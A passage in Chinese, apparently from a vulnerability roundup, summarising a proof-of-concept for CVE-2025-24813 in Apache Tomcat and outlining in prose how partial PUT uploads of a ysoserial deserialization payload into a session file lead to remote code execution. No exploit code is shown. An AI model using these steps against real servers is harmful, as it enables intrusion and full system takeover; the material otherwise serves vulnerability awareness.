*   `main.py`  脚本尝试通过PUT请求写入文件，可能会写入恶意代码或后门。虽然脚本主要目的是RCE，但存在修改文件内容的潜在风险。

总体而言，PoC 本身主要是为了演示漏洞，但从外部源下载 ysoserial 存在一定的风险。使用者应谨慎对待。

**利用方式：**

1.  **检查可写性:** 首先，确定目标 Tomcat 服务器上的默认 Servlet 是否启用了写入权限，并且支持 partial PUT 请求。
2.  **生成 Payload:**  使用 ysoserial 或其他工具，根据目标应用程序中存在的库，生成一个恶意的 Java 序列化 Payload，该 Payload 包含要执行的命令。
3.  **上传 Payload:**  将生成的 Payload 通过 PUT 请求上传到 Tomcat 服务器，利用 partial PUT 功能将 Payload 写入到 session 文件中。
4.  **触发反序列化:**  通过构造特定的 HTTP 请求，访问包含恶意 Payload 的 session 文件，触发 Java 反序列化漏洞，从而执行 Payload 中的命令。

该漏洞允许攻击者在目标服务器上执行任意代码，从而完全控制系统。如果无法直接执行代码，攻击者还可以利用该漏洞进行信息泄露，读取敏感文件，或者修改服务器上的文件。

**项目地址:** [yaleman/cve-2025-24813-poc](https://github.com/yaleman/cve-2025-24813-poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

